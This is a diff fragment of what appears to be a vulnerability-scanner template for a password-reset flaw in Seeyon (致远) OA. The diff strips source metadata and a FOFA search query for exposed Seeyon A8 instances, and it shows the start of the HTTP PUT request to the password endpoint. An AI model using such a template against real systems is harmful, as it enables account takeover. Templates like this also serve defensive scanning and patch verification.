@@ -3,12 +3,8 @@ info:
   name: 致远OA ucpcLogin 密码重置漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nxffynl61fp2olvi'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nxffynl61fp2olvi
-    fofa: app="致远A8"
 http:
 - raw:
   - 'PUT /seeyon/rest/orgMember/-4401606663639775639/password/share.do HTTP/1.1
